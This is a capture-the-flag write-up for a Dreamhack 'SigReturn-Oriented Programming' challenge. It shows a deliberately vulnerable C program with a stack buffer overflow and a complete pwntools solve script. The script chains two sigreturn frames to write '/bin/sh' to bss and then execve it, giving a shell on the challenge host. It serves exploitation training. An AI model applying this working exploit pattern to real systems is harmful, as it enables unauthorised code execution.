# Write-up of the challenge "SigReturn-Oriented Programming"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to use **Sigreturn** to be able to spawn a **shell**.

## Program structure

```
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024);
}

```

## Security breach

There is a basic **bof** vunlerability:

```
read(0, buf ,1024);
```

## Solution

So we can see in the source code cleary that there are rax, ret and syscall gadgets. So I tried first to check if hopefully there is **/bin/sh** string in the binary but there wasn't any sadly. However we can write **/bin/sh** in the **bss** data segement using the **syscall**. So using **sigreturnframe** to **read** from **bss** and then using another **sigreturnframe** to exceute **excev** **/bin/sh** then we can spawn a shell! However before sending our **sigreturnframe** we should make the rax 15 and then syscall after because it will do **sigreturn** and will read from our frame!

solve.py:

```
from pwn import *

context.arch = "amd64"

# p = process('./srop')
p = remote("host8.dreamhack.games", 15986)

elf = ELF("./srop")
rop = ROP(elf)

gadget = rop.find_gadget(['pop rax', 'syscall', 'ret'])[
    0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

binsh = b"/bin/sh\x00"
bss = elf.bss()

# read(0, bss, 0x1000)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x1000
frame.rip = syscall
frame.rsp = bss

payload = b"A" * 24
payload += p64(gadget)
payload += p64(15)
payload += bytes(frame)
p.sendline(payload)


# execve("/bin/sh", 0, 0)
frame_2 = SigreturnFrame()
frame_2.rip = syscall
frame_2.rax = 59
frame_2.rdi = bss + 264

payload_2 = p64(gadget)
payload_2 += p64(15)
payload_2 += bytes(frame_2)
payload_2 += binsh

print(len(payload_2))


p.sendline(payload_2)
p.interactive()

```
